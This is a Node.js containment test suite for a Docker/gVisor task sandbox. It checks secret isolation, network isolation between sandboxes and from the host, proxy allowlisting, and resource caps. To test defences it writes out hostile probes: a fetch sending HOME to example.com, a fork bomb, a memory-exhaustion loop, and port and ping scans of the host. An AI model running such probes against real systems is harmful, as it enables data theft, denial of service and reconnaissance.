#!/usr/bin/env node
// Containment checks for the task sandbox. Each check runs against a fresh container and prints
// PASS or FAIL. These are the "blast radius" claims made in the README, measured.
// Usage: node test/containment.mjs   (after scripts/setup.sh; RING_RUNTIME=runsc runs the sandboxes in gVisor)
// At exit it writes ~/.ring/selftest/containment.json, the result the app shows on /status.
import { existsSync, mkdirSync, readFileSync, renameSync, writeFileSync } from 'node:fs';
import { mkdtemp, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { STALE_NETWORK_MS, Sandbox, TASK_LABEL, run } from '../runner/sandbox.mjs';
import { runTask } from '../runner/run-task.mjs';

const results = [];
const check = (name, pass, detail) => { results.push({ name, pass, detail }); console.log(`${pass ? 'PASS' : 'FAIL'}  ${name}${detail ? `  (${detail})` : ''}`); };
const gone = async (name) => (await run('docker', ['ps', '-aq', '--filter', `name=^${name}$`])).stdout.trim() === '';
const runtime = process.env.RING_RUNTIME || undefined;
console.log(`runtime: ${runtime ?? 'docker default'}`);

// The result file for /status, written at exit. A suite that crashes part-way gets one failed check
// more, so a partial run never reads as a full pass. `runtime` is what Docker reports for the sandbox;
// `commit` is the deployed commit (app/VERSION.json), so /status can tell a result from older code.
let sandboxRuntime = null;
let finished = false;
const deployedCommit = () => {
  try { return JSON.parse(readFileSync(new URL('../app/VERSION.json', import.meta.url), 'utf8')).commit ?? null; } catch { return null; }
};
process.on('exit', () => {
  const checks = results.map(({ name, pass }) => ({ name, pass }));
  if (!finished) checks.push({ name: 'the suite ran to the end', pass: false });
  const file = path.join(os.homedir(), '.ring', 'selftest', 'containment.json');
  try {
    mkdirSync(path.dirname(file), { recursive: true });
    const data = { suite: 'containment', runtime: sandboxRuntime ?? runtime ?? null, commit: deployedCommit(), passed: checks.filter((c) => c.pass).length, total: checks.length, at: new Date().toISOString(), checks };
    writeFileSync(`${file}.tmp`, `${JSON.stringify(data, null, 2)}\n`);
    renameSync(`${file}.tmp`, file);
  } catch (err) {
    console.error(`could not write ${file}: ${err.message}`);
  }
});
// Stopped from outside (the app's 20-minute self-test limit, Ctrl-C, a dropped SSH session): the
// sandboxes this run made go first, with their networks (8 s at most), then exit through the handler
// above, so the result file records a failed run instead of keeping the previous one.
let stopping = false;
for (const sig of ['SIGTERM', 'SIGINT', 'SIGHUP']) {
  process.on(sig, () => {
    if (stopping) return;
    stopping = true;
    Sandbox.destroyLive().catch(() => {}).finally(() => process.exit(1));
  });
}

// Sandbox networks left by an earlier run that was killed: Mantis Ring's own (by label), with no
// sandbox on them, older than 10 minutes (a task may be starting on a newer one).
try {
  const stale = await Sandbox.removeNetworks(TASK_LABEL, { minAgeMs: STALE_NETWORK_MS });
  if (stale) console.log(`removed ${stale} stale sandbox network(s)`);
} catch (err) {
  console.log(`note: stale sandbox networks were not removed: ${err.message}`);
}
/** The own network of every sandbox this suite makes: none may be left at the end. */
const networks = [];

// --- The probes that run inside a sandbox -------------------------------------------------------------
// node -e, the first lines of PROBE and HOST_PROBE: tcp(host, port) resolves with "connected" or the
// reason it did not (an error code, or "timeout" after 3 s). A link-local IPv6 address is tried
// through the sandbox's own interface.
const TCP = [
  'const net = require("net"), http = require("http"), os = require("os");',
  'const T = 3000;',
  'let ifs = {}; try { ifs = os.networkInterfaces(); } catch {}',
  'const myIf = Object.keys(ifs).find((n) => (ifs[n] ?? []).some((a) => !a.internal)) ?? "eth0";',
  'const scoped = (a) => (/^fe80:/i.test(a) ? a + "%" + myIf : a);',
  'const tcp = (host, port) => new Promise((ok) => {',
  '  let s;',
  '  try { s = net.connect(port, host); } catch (e) { ok(e.code || "error"); return; }',
  '  const t = setTimeout(() => { s.destroy(); ok("timeout"); }, T);',
  '  s.on("connect", () => { clearTimeout(t); s.destroy(); ok("connected"); });',
  '  s.on("error", (e) => { clearTimeout(t); ok(e.code || "error"); });',
  '});',
];
// node -e SERVE: a server on port 3000 on every address the sandbox has (IPv4, and IPv6 where it has it).
const SERVE = 'const h = require("http"), answer = (q, s) => s.end("ring-peer-ok"); h.createServer(answer).listen(3000, "0.0.0.0"); '
  + 'h.createServer(answer).on("error", () => {}).listen({ port: 3000, host: "::", ipv6Only: true });';
// node -e ADDRESSES: every address the sandbox has but loopback, as one line of JSON.
const ADDRESSES = 'let ifs = {}; try { ifs = require("os").networkInterfaces(); } catch {} const out = []; for (const [iface, list] of Object.entries(ifs)) '
  + 'for (const a of list ?? []) if (!a.internal) out.push({ address: a.address, family: a.family, iface }); console.log(JSON.stringify(out));';
// node -e PROBE <peer addresses, JSON> <own ip> <peer ip> <peer name>: one line of JSON with what each try got.
const PROBE = [
  ...TCP,
  'const [list, own, peer, peerName] = process.argv.slice(1);',
  'const get = (host, port) => new Promise((ok) => {',
  '  let q;',
  '  try { q = http.get({ host, port, path: "/", timeout: T }, (r) => { let b = ""; r.on("data", (d) => { b += d; }); r.on("end", () => ok(r.statusCode + " " + b.slice(0, 40))); }); } catch (e) { ok(e.code || "error"); return; }',
  '  q.on("timeout", () => { q.destroy(); ok("timeout"); });',
  '  q.on("error", (e) => ok(e.code || "error"));',
  '});',
  'const viaProxy = (head) => new Promise((ok) => {',
  '  const s = net.connect(8888, "ring-proxy");',
  '  const t = setTimeout(() => { s.destroy(); ok("timeout"); }, T);',
  '  s.on("connect", () => s.write(head + "\\r\\n\\r\\n"));',
  '  s.once("data", (d) => { clearTimeout(t); s.destroy(); ok(String(d).split("\\r\\n")[0]); });',
  '  s.on("error", (e) => { clearTimeout(t); ok(e.code || "error"); });',
  '});',
  '(async () => {',
  '  let self = "";',
  '  for (let i = 0; i < 20; i++) { self = await get(own, 3000); if (self.startsWith("200")) break; await new Promise((r) => setTimeout(r, 250)); }',
  '  const out = { self, peer: [] };',
  '  for (const a of JSON.parse(list)) out.peer.push({ address: a, tcp: await tcp(scoped(a), 3000), http: await get(scoped(a), 3000) });',
  '  out.proxyTcp = await tcp("ring-proxy", 8888);',
  '  out.proxyGet = await viaProxy("GET http://" + peer + ":3000/ HTTP/1.1\\r\\nHost: " + peer + ":3000\\r\\nConnection: close");',
  '  out.proxyConnect = await viaProxy("CONNECT " + peer + ":443 HTTP/1.1\\r\\nHost: " + peer + ":443");',
  '  out.proxyByName = await viaProxy("GET http://" + peerName + ":3000/ HTTP/1.1\\r\\nHost: " + peerName + ":3000\\r\\nConnection: close");',
  '  console.log(JSON.stringify(out));',
  '})();',
].join('\n');
// node -e HOST_PROBE <addresses, JSON> <ports, JSON>: a TCP connect to every port of every address,
// all at once, and one to the proxy; one line of JSON, with the sandbox's own addresses.
const HOST_PROBE = [
  ...TCP,
  'const [list, portList] = process.argv.slice(1);',
  '(async () => {',
  '  const ports = JSON.parse(portList);',
  '  const own = Object.values(ifs).flat().filter((a) => a && !a.internal).map((a) => a.address);',
  '  const tries = await Promise.all(JSON.parse(list).flatMap((a) => ports.map(async (port) => ({ address: a, port, tcp: await tcp(scoped(a), port) }))));',
  '  console.log(JSON.stringify({ own, proxy: await tcp("ring-proxy", 8888), tries }));',
  '})();',
].join('\n');
// perl -e PING <IPv4 address>...: an ICMP echo to each through an unprivileged ping socket (Linux and
// gVisor both have them); prints one word per address: "reply", "no-reply", "unreachable" or why it
// could not try. Every probe pings the proxy too: its answer shows that ICMP works in the sandbox.
const PING = [
  'use Socket;',
  'sub ping {',
  '  my ($ip) = @_;',
  '  return "none" unless $ip;',
  '  socket(my $s, PF_INET, SOCK_DGRAM, 1) or return "no-socket";',
  '  send($s, pack("CCnnnA4", 8, 0, 0, 0, 1, "ring"), 0, sockaddr_in(0, inet_aton($ip))) or return "unreachable";',
  '  my $r = ""; vec($r, fileno($s), 1) = 1;',
  '  select($r, undef, undef, 2) > 0 or return "no-reply";',
  '  defined(recv($s, my $b, 1500, 0)) or return "recv-error";',
  '  my $t = unpack("C", $b);',
  '  $t = unpack("C", substr($b, ($t & 15) * 4, 1)) if ($t >> 4) == 4;',
  '  return $t == 0 ? "reply" : "icmp-$t";',
  '}',
  'print join(" ", map { ping($_) } @ARGV), "\\n";',
].join('\n');
const IPV4 = /^\d{1,3}(\.\d{1,3}){3}$/;
/** {network: IPv4 address} of a container, as Docker reports it. */
const addresses = async (name) => {
  const r = await run('docker', ['inspect', '-f', '{{json .NetworkSettings.Networks}}', name], { timeoutMs: 30_000 });
  try { return Object.fromEntries(Object.entries(JSON.parse(r.stdout)).map(([k, v]) => [k, v?.IPAddress ?? ''])); } catch { return {}; }
};
const status = (s) => /^HTTP\/1\.[01] (\d{3})/.exec(s ?? '')?.[1] ?? String(s);

// --- Can a sandbox reach the host it runs on? ---------------------------------------------------------
/** The ports tried on every address of the host: sshd, Caddy (HTTP, HTTPS), the app's port and one more. */
const HOST_PORTS = [22, 80, 443, 8080, 9000];
/** Every address of this host but loopback, as Node lists them, with its interface. */
const hostAddresses = () => {
  let ifs = {};
  try { ifs = os.networkInterfaces(); } catch { ifs = {}; }
  return Object.entries(ifs).flatMap(([iface, list]) => (list ?? []).filter((a) => !a.internal).map((a) => ({ address: a.address, iface })));
};
/** The first host address of an IPv4 subnet ("172.21.0.0/16" → "172.21.0.1"), the one Docker takes as a network's gateway. */
const firstHost = (subnet) => {
  const m = /^(\d+)\.(\d+)\.(\d+)\.(\d+)\/\d+$/.exec(subnet ?? '');
  return m ? `${m[1]}.${m[2]}.${m[3]}.${Number(m[4]) + 1}` : '';
};
const PRIVATE = /^(10\.|169\.254\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|100\.(6[4-9]|[7-9]\d|1[01]\d|12[0-7])\.)/;
/** What the ports of one address got: "22/80/443 timeout" when they agree, else "22 x, 80 y". */
const byPort = (tries) => {
  const kinds = [...new Set(tries.map((t) => t.tcp))];
  return kinds.length === 1 ? `${tries.map((t) => t.port).join('/')} ${kinds[0]}` : tries.map((t) => `${t.port} ${t.tcp}`).join(', ');
};

/**
 * Whether sandbox `b` can reach the host it runs on. On the host: the bridge of the sandbox's network
 * and what the host has on it, who holds which address on the network, and every address the host
 * has (Node's list: the public one, Docker's other bridges, IPv6 ones). Docker's gateway address for
 * the network is tried too, unless a container holds it: with inhibit_ipv4 Docker does not keep it
 * for the bridge, and the first container on the network, the proxy, gets it. In the sandbox: a TCP
 * connect to each target on HOST_PORTS, all at once, and an ICMP echo to each IPv4 one. The proxy
 * must answer both a TCP connect and its echo, so a probe that cannot reach anything at all does not
 * pass.
 * @returns {Promise<{bridge: {pass: boolean, detail: string}, reach: {pass: boolean, detail: string}}>}
 */
async function hostReach(b) {
  const ins = await run('docker', ['network', 'inspect', '--format', '{{json .}}', b.network], { timeoutMs: 30_000 });
  let n = {};
  try { n = JSON.parse(ins.stdout.trim().split('\n').pop()); } catch { n = {}; }
  const ipam = (n?.IPAM?.Config ?? []).find((c) => IPV4.test(c?.Gateway ?? '') || IPV4.test(String(c?.Subnet ?? '').split('/')[0])) ?? {};
  const listed = IPV4.test(ipam.Gateway ?? '') ? ipam.Gateway : '';
  const gateway = listed || firstHost(ipam.Subnet);
  const members = Object.values(n?.Containers ?? {}).map((c) => ({ name: String(c?.Name ?? '?'), address: String(c?.IPv4Address ?? '').split('/')[0] }));
  const holder = members.find((m) => m.address === gateway)?.name;
  const bridge = n?.Options?.['com.docker.network.bridge.name'] || (typeof n?.Id === 'string' ? `br-${n.Id.slice(0, 12)}` : '');
  const host = hostAddresses();
  const where = new Map(host.map((a) => [a.address, a.iface]));
  const onBridge = host.filter((a) => a.iface === bridge);
  const bridge4 = onBridge.filter((a) => IPV4.test(a.address)).map((a) => a.address);
  const bridge6 = onBridge.filter((a) => !IPV4.test(a.address)).map((a) => a.address);
  const seen = bridge !== '' && existsSync(`/sys/class/net/${bridge}`);
  let v6off = '';
  try { v6off = readFileSync(`/proc/sys/net/ipv6/conf/${bridge}/disable_ipv6`, 'utf8').trim(); } catch { v6off = ''; }
  const gatewayName = listed ? 'Docker\'s gateway address' : 'the subnet\'s first address (Docker lists no gateway)';
  const gatewayText = `${gatewayName} ${gateway || 'unknown'}${holder ? ` is ${holder}'s` : bridge4.includes(gateway) ? ' is the host\'s' : ', held by no container'}`;
  const bridgeDetail = !bridge ? `no bridge found for ${b.network}` : !seen ? `${bridge} is not an interface of this host`
    : `${bridge}: ${bridge4.join(' ') || 'no IPv4 address'}; on ${b.network}: ${members.map((m) => `${m.name} ${m.address || 'no IPv4'}`).join(', ') || 'no container'}; `
      + `${gatewayText}; IPv6 on the bridge: ${bridge6.join(' ') || 'no address'}${v6off === '1' ? ' (off)' : ''}`;

  // The gateway address is tried unless a container holds it, then every address of the host.
  const targets = [...new Set([...(gateway && !holder ? [gateway] : []), ...host.map((a) => a.address)].filter(Boolean))];
  const v4 = targets.filter((a) => IPV4.test(a));
  const p = await b.execArgs(['node', '-e', HOST_PROBE, JSON.stringify(targets), JSON.stringify(HOST_PORTS)], { timeoutMs: 60_000 });
  let r;
  try { r = JSON.parse(p.stdout.trim().split('\n').pop()); } catch { r = { error: (p.stderr || p.stdout || `exit ${p.code}`).trim().split('\n').pop() }; }
  const proxyIp = (await addresses('ring-proxy'))[b.network] ?? '';
  const icmp = await b.execArgs(['perl', '-e', PING, proxyIp, ...v4], { timeoutMs: 30_000 + 3_000 * v4.length });
  const [pingProxy, ...pingHost] = icmp.code === 0 ? icmp.stdout.trim().split(/\s+/) : [];
  const tries = Array.isArray(r.tries) ? r.tries : [];
  const own = Array.isArray(r.own) ? r.own : [];
  // The host's own addresses must be known (Node listed at least one IPv4 address), and so must the gateway.
  const reachOk = !r.error && IPV4.test(gateway) && host.some((a) => IPV4.test(a.address)) && tries.length === targets.length * HOST_PORTS.length
    && tries.every((t) => t.tcp !== 'connected') && r.proxy === 'connected'
    && pingProxy === 'reply' && pingHost.length === v4.length && pingHost.every((x) => x !== 'reply');
  const label = (a) => {
    const what = [a === gateway ? 'gateway' : '', where.get(a) ?? '', IPV4.test(a) && !PRIVATE.test(a) ? 'public' : ''].filter(Boolean).join(', ');
    return what ? `${a} (${what})` : a;
  };
  const rows = targets.map((a) => {
    const mine = tries.filter((t) => t.address === a).sort((x, y) => x.port - y.port);
    const i = v4.indexOf(a);
    return `${label(a)}: TCP ${mine.length ? byPort(mine) : 'not tried'}${i >= 0 ? `, ping ${pingHost[i] ?? 'not tried'}` : ''}`;
  });
  const reachDetail = r.error ? `the probe failed (${r.error})`
    : `${holder ? `${gatewayName} ${gateway} is ${holder}'s, not the host's, so it is not tried; ` : ''}${rows.join('; ')}; `
      + `the sandbox has ${own.join(' ') || 'no address'}${own.some((a) => !IPV4.test(a)) ? '' : ' (no IPv6)'}; ring-proxy:8888 ${r.proxy}, ping ${pingProxy ?? 'not tried'}`;
  return { bridge: { pass: seen && bridge4.length === 0, detail: bridgeDetail }, reach: { pass: reachOk, detail: reachDetail } };
}

// A secret on the host that must never reach the sandbox.
process.env.RING_FAKE_API_KEY = 'sk-should-never-leak';

const box = await Sandbox.create({ runtime });
networks.push(box.network);
try {
  sandboxRuntime = await box.runtimeName().catch(() => null);
  const env = await box.exec('env');
  const leaked = env.stdout.split('\n').filter((l) => /KEY|TOKEN|SECRET|PASSWORD/i.test(l));
  check('no secrets in the sandbox environment', leaked.length === 0 && !env.stdout.includes('sk-should-never-leak'), leaked.join(', ') || 'only proxy and path variables');

  const user = await box.exec('id -u');
  check('runs as an unprivileged user', user.stdout.trim() !== '0', `uid ${user.stdout.trim()}`);

  const ro = await box.exec('touch /usr/local/bin/x');
  check('root filesystem is read-only', ro.code !== 0, ro.stderr.trim().split('\n').pop());

  const direct = await box.exec(`node -e "require('net').connect(443, '1.1.1.1').on('connect', () => process.exit(0)).on('error', () => process.exit(1)); setTimeout(() => process.exit(2), 5000)"`, { timeoutMs: 15_000 });
  check('no direct route to the internet', direct.code !== 0, direct.code === 2 ? 'connect timed out' : 'connect refused');

  // The VM itself: sshd, Caddy and the app run there. Docker puts a network's gateway address on its
  // bridge unless told otherwise (inhibit_ipv4), and a sandbox could then connect to the host there.
  const reach = await hostReach(box);
  check('the host has no IPv4 address on a sandbox\'s network (its bridge has none)', reach.bridge.pass, reach.bridge.detail);
  check(`a sandbox cannot reach the VM host: no address of the host answers TCP on ports ${HOST_PORTS.join(', ')} or a ping (nor does the network's gateway address, when no container holds it), while the proxy answers both`,
    reach.reach.pass, reach.reach.detail);

  const gh = await box.exec('git ls-remote https://github.com/vulinh1704/mantis HEAD', { timeoutMs: 30_000 });
  check('allowlisted host works through the proxy (github.com)', gh.code === 0, gh.code === 0 ? 'git ls-remote ok' : gh.stderr.trim().split('\n').pop());

  const other = await box.exec('git ls-remote https://gitlab.com/gitlab-org/gitlab-foss.git HEAD', { timeoutMs: 30_000 });
  check('any other host is refused by the proxy', other.code !== 0, other.stderr.trim().split('\n').pop());

  const exfil = await box.exec(`node -e "fetch('https://example.com/?k=' + process.env.HOME).then(() => process.exit(0), () => process.exit(1))"`, { timeoutMs: 20_000 });
  check('a script cannot send data out (fetch to example.com)', exfil.code !== 0);

  // The loop prints how many MB it holds after each 256 MB block, so the check can tell "killed at the
  // cap" from "killed by something else". runc's OOM killer gives exit 137; gVisor kills the process
  // inside its own kernel and docker exec reports other codes, so under runsc the check accepts any
  // non-zero exit that came before the timeout with the last report at or under the 3 GB cap.
  const mem = await box.exec(`node -e "const a = []; for (;;) { a.push(Buffer.alloc(256 * 1024 * 1024, 1)); console.log(a.length * 256) }"`, { timeoutMs: 60_000 });
  const oom = (await run('docker', ['inspect', '-f', '{{.State.OOMKilled}} {{.State.Running}}', box.name])).stdout.trim();
  const heldMb = Number(mem.stdout.trim().split('\n').pop()) || 0;
  const capMb = 3 * 1024;
  const killed = mem.code === 137 || (runtime === 'runsc' && mem.code !== 0 && !mem.timedOut && heldMb <= capMb);
  check('memory is capped (allocation loop is killed)', killed, `exit ${mem.code}${mem.timedOut ? ' (timed out)' : ''}, held ${heldMb} MB of the ${capMb} MB cap when it stopped, container ${oom.endsWith('true') ? 'still running' : 'stopped'}`);
} finally {
  await box.destroy();
}
check('container is gone after destroy()', await gone(box.name));

// Two sandboxes at once, as two tasks of the app run: each on its own internal network, each with a
// server on port 3000 on every address it has (IPv4, and IPv6 wherever the sandbox has an address).
// Neither may reach the other on any of those addresses (a TCP connect, an HTTP request) or by an ICMP
// echo, nor through the proxy by address or by name, while each still reaches the proxy, and the
// proxy answers its echo, which shows that ICMP works in the sandbox at all. The proxy is on both
// networks and relays only to the four allowlisted hosts. The CONNECT asks for port 443, the one port
// tinyproxy allows for CONNECT, so that the allowlist is what refuses it.
const pairName = 'two sandboxes at once cannot reach each other (TCP and HTTP on each of their addresses, ping; through the proxy by address, by CONNECT to 443 and by name), and each still reaches the proxy, which answers its ping';
const made = await Promise.allSettled([Sandbox.create({ runtime }), Sandbox.create({ runtime })]);
const pair = made.flatMap((m) => (m.status === 'fulfilled' ? [m.value] : []));
networks.push(...pair.map((b) => b.network));
try {
  if (pair.length < 2) throw new Error(`a sandbox did not start: ${made.find((m) => m.status === 'rejected')?.reason?.message}`);
  for (const b of pair) await b.execDetached(`node -e '${SERVE}'`, '/tmp/serve.log');
  const proxyAt = await addresses('ring-proxy');
  const views = [];
  for (const [i, b] of pair.entries()) {
    const nets = await addresses(b.name);
    // Every address the sandbox has: Docker's IPv4 address, and what the sandbox itself lists (IPv6 too).
    const inside = await b.execArgs(['node', '-e', ADDRESSES], { timeoutMs: 30_000 });
    let listed = [];
    try { listed = JSON.parse(inside.stdout.trim().split('\n').pop()); } catch { listed = []; }
    const ip = nets[b.network] ?? '';
    const all = [...new Set([ip, ...(Array.isArray(listed) ? listed : []).map((a) => a?.address)].filter((a) => typeof a === 'string' && a !== ''))];
    views.push({ tag: 'AB'[i], box: b, nets, ip, all, proxyIp: proxyAt[b.network] ?? '' });
  }
  const layout = views.every((v) => Object.keys(v.nets).length === 1 && IPV4.test(v.ip) && IPV4.test(v.proxyIp)) && views[0].box.network !== views[1].box.network;
  const rows = [`${views.map((v) => `${v.tag} ${v.all.join(' ') || 'no address'} alone on ${Object.keys(v.nets).join('+') || 'no network'}, ring-proxy ${v.proxyIp || 'absent'} there`).join('; ')}`];
  let apart = layout;
  for (const [i, me] of views.entries()) {
    const peer = views[1 - i];
    const p = await me.box.execArgs(['node', '-e', PROBE, JSON.stringify(peer.all), me.ip, peer.ip, peer.box.name], { timeoutMs: 90_000 });
    let r;
    try { r = JSON.parse(p.stdout.trim().split('\n').pop()); } catch { r = { error: (p.stderr || p.stdout || `exit ${p.code}`).trim().split('\n').pop() }; }
    const icmp = await me.box.execArgs(['perl', '-e', PING, me.proxyIp, peer.ip], { timeoutMs: 30_000 });
    const [pingProxy, pingPeer] = icmp.code === 0 ? icmp.stdout.trim().split(/\s+/) : ['no-perl', 'no-perl'];
    const tried = Array.isArray(r.peer) ? r.peer : [];
    // Each of the peer's addresses was tried and none answered; the proxy's echo shows that ping itself works here.
    const ok = /^200 ring-peer-ok/.test(r.self ?? '') && tried.length === peer.all.length && tried.some((x) => x.address === peer.ip)
      && tried.every((x) => x.tcp !== 'connected' && !/^\d{3}\b/.test(x.http ?? '200'))
      && r.proxyTcp === 'connected' && [r.proxyGet, r.proxyConnect, r.proxyByName].every((x) => status(x) === '403')
      && pingProxy === 'reply' && pingPeer !== 'reply';
    apart &&= ok;
    rows.push(r.error ? `${me.tag}→${peer.tag}: the probe failed (${r.error})`
      : `${me.tag}→${peer.tag}: ${tried.map((x) => `${x.address} TCP ${x.tcp}, HTTP ${x.http}`).join('; ') || 'no address tried'}; ping ${pingPeer} (to the proxy: ${pingProxy}); through the proxy GET ${status(r.proxyGet)}, CONNECT :443 ${status(r.proxyConnect)}, by name ${status(r.proxyByName)}; ${me.tag}→proxy:8888 ${r.proxyTcp}; ${me.tag}'s own server ${String(r.self).split(' ')[0]}`);
  }
  check(pairName, apart, rows.join('; '));
} catch (err) {
  check(pairName, false, err.message);
} finally {
  await Promise.allSettled(pair.map((b) => b.destroy()));
}
check('both of their containers are gone after destroy()', pair.length === 2 && (await Promise.all(pair.map((b) => gone(b.name)))).every(Boolean), pair.map((b) => b.name).join(', '));

// Fork bomb last, in its own sandbox: once the cap is hit nothing new can start inside, so the
// process count is read from the host (the container's cgroup) instead.
const bomb = await Sandbox.create({ runtime });
networks.push(bomb.network);
try {
  const r = await bomb.exec(`i=0; while [ $i -lt 700 ]; do sleep 60 > /dev/null 2>&1 & i=$((i+1)); done; echo started $i`, { timeoutMs: 60_000 });
  const pids = Number((await run('docker', ['stats', '--no-stream', '--format', '{{.PIDs}}', bomb.name])).stdout.trim());
  const refused = /fork|resource temporarily unavailable|cannot/i.test(r.stderr);
  const capped = pids > 0 && pids <= 512 && refused;
  // Under gVisor the cap also counts the sandbox kernel's own host threads (about two per process
  // inside), so the bomb reaches it after a few hundred processes and the whole sandbox stops.
  // That still holds the bomb at the cap; the check only accepts it when fewer than 700 started.
  let stopped = false;
  if (!capped && runtime === 'runsc' && !/started 700/.test(r.stdout)) {
    for (let i = 0; i < 20 && !stopped; i++) {
      stopped = (await run('docker', ['inspect', '-f', '{{.State.Running}}', bomb.name])).stdout.trim() !== 'true';
      if (!stopped) await new Promise((ok) => setTimeout(ok, 250));
    }
  }
  check('process count is capped (fork bomb)', capped || stopped, stopped
    ? `gVisor: the sandbox stopped at the 512 cap before 700 processes started (${r.stderr.trim().split('\n').pop()})`
    : `${pids} processes after trying 700; ${refused ? 'further forks refused' : 'no refusal seen'}`);
} finally {
  await bomb.destroy();
}
check('fork-bomb container is gone too', await gone(bomb.name));

// A dev server that never answers: the task must give up within its time limit and clean up.
const dir = await mkdtemp(path.join(os.tmpdir(), 'ring-hang-'));
await writeFile(path.join(dir, 'index.html'), '<h1>never served</h1>');
const t = Date.now();
const hung = await runTask({ repo: dir, devCmd: 'sleep 999', timeoutSec: 25, runtime });
networks.push(hung.network);
const secs = Math.round((Date.now() - t) / 1000);
check('a hanging task is stopped by the time limit', !hung.ok && /timed out/.test(hung.error ?? '') && secs <= 40, `${hung.error?.split('\n')[0]} after ${secs}s`);
check('its container is destroyed too', hung.destroyed && await gone(hung.sandbox));

// Every sandbox's own network went with it: none may pile up in Docker's address pools.
const ls = await run('docker', ['network', 'ls', '--format', '{{.Name}}'], { timeoutMs: 30_000 });
const present = new Set(ls.stdout.split('\n').map((s) => s.trim()).filter(Boolean));
const ours = networks.filter(Boolean);
const leftNets = ours.filter((n) => present.has(n));
const onProxy = Object.keys(await addresses('ring-proxy')).filter((n) => ours.includes(n));
check('no sandbox network is left after destroy(), and ring-proxy is on none of them', ls.code === 0 && ours.length === 5 && leftNets.length === 0 && onProxy.length === 0,
  ls.code !== 0 ? `docker network ls failed: ${ls.stderr.trim().split('\n').pop()}`
    : leftNets.length || onProxy.length ? `still there: ${[...new Set([...leftNets, ...onProxy])].join(' ')}` : `${ours.length} of 5 sandbox networks made and removed`);

const failed = results.filter((r) => !r.pass);
console.log(`\n${results.length - failed.length}/${results.length} containment checks passed`);
finished = true;
process.exit(failed.length ? 1 : 0);
